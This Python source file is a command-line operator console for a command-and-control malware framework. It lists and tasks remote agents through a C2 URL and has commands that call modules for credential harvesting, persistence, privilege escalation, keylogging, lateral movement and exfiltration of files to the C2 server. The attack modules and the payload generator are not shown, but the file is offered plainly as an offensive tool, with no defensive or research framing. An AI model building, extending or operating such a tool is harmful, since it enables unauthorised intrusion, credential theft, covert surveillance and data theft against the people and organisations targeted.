import typer
import requests
from modules import credential_harvesting, persistence, privilege_escalation, reconnaissance, exfiltration, keylogging, lateral_movement

cli = typer.Typer()

@cli.command()
def list_agents(c2_url: str):
    """List all registered agents."""
    response = requests.get(f"{c2_url}/list_agents")
    if response.status_code == 200:
        agents = response.json().get("agents", [])
        typer.echo("Registered Agents:")
        for agent in agents:
            typer.echo(f" - {agent['AgentID']}")
    else:
        typer.echo(f"Failed to list agents: {response.status_code}")

@cli.command()
def send_command(c2_url: str, agent_id: str, command: str):
    """Send a command to a specific agent."""
    payload = {
        "AgentID": agent_id,
        "Command": command
    }
    response = requests.post(f"{c2_url}/sendcommand", json=payload)
    if response.status_code == 200:
        typer.echo(f"Command sent to agent {agent_id}.")
    else:
        typer.echo(f"Failed to send command: {response.status_code}")

@cli.command()
def generate_payload(platform: str):
    """Generate an obfuscated payload for a specific platform."""
    typer.echo(f"Generating payload for {platform}...")

@cli.command()
def harvest_credentials():
    credentials = credential_harvesting.harvest_credentials()
    typer.echo("Credentials harvested:")
    for cred in credentials:
        typer.echo(cred)

@cli.command()
def establish_persistence():
    persistence.establish_persistence()
    typer.echo("Persistence established.")

@cli.command()
def escalate_privileges():
    privilege_escalation.escalate_privileges()
    typer.echo("Privilege escalation attempted.")

@cli.command()
def gather_system_info():
    system_info = reconnaissance.gather_system_info()
    typer.echo("System Information:")
    typer.echo(system_info)

@cli.command()
def exfiltrate_data(file_path: str, c2_url: str):
    status_code = exfiltration.exfiltrate_data(file_path, c2_url)
    typer.echo(f"Data exfiltration status: {status_code}")

@cli.command()
def start_keylogger(log_file_path: str):
    """Start a keylogger and save logs to the specified file."""
    keylogging.start_keylogger(log_file_path)
    typer.echo(f"Keylogger started, logging to {log_file_path}")

@cli.command()
def move_laterally(target_ip: str, username: str, password: str):
    """Attempt lateral movement to the target IP using the provided credentials."""
    lateral_movement.move_laterally(target_ip, username, password)
    typer.echo(f"Attempted lateral movement to {target_ip}")

if __name__ == "__main__":
    cli()
